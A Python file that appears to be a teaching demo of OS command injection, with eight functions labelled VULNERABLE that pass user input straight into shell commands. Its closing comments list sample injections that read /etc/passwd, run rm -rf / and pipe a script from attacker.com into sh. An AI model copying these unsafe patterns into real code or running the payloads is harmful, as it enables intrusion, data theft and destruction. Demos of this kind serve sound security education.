"""
Command Injection Vulnerability Demo
OWASP A03:2021 - Injection
"""
import os
import subprocess

def ping_host(hostname):
    """VULNERABLE: Command injection via os.system"""
    # VULNERABLE: Direct string concatenation with user input
    command = "ping -c 4 " + hostname
    os.system(command)

def check_dns(domain):
    """VULNERABLE: Command injection via subprocess with shell=True"""
    # VULNERABLE: Using shell=True with user input
    cmd = f"nslookup {domain}"
    subprocess.call(cmd, shell=True)

def list_directory(path):
    """VULNERABLE: Command injection in directory listing"""
    # VULNERABLE: Unsanitized path in shell command
    os.system(f"ls -la {path}")

def compress_file(filename):
    """VULNERABLE: Command injection via subprocess.Popen"""
    # VULNERABLE: Shell command with user-controlled filename
    cmd = f"tar -czf archive.tar.gz {filename}"
    subprocess.Popen(cmd, shell=True)

def get_file_info(filepath):
    """VULNERABLE: Command injection with os.popen"""
    # VULNERABLE: Using os.popen with user input
    result = os.popen(f"file {filepath}").read()
    return result

def convert_image(input_file, output_format):
    """VULNERABLE: Command injection in image conversion"""
    # VULNERABLE: Multiple user inputs in shell command
    command = f"convert {input_file} output.{output_format}"
    os.system(command)

def backup_database(db_name):
    """VULNERABLE: Command injection in database backup"""
    # VULNERABLE: Unsanitized database name
    backup_cmd = f"mysqldump -u root {db_name} > backup.sql"
    subprocess.call(backup_cmd, shell=True)

def search_logs(search_term):
    """VULNERABLE: Command injection in log search"""
    # VULNERABLE: grep with user input
    cmd = f"grep '{search_term}' /var/log/app.log"
    result = subprocess.check_output(cmd, shell=True)
    return result

if __name__ == "__main__":
    # Example exploitation:
    # ping_host("8.8.8.8; cat /etc/passwd")
    # check_dns("google.com && rm -rf /")
    # compress_file("file.txt; curl attacker.com/malware.sh | sh")
    print("Command injection demo")
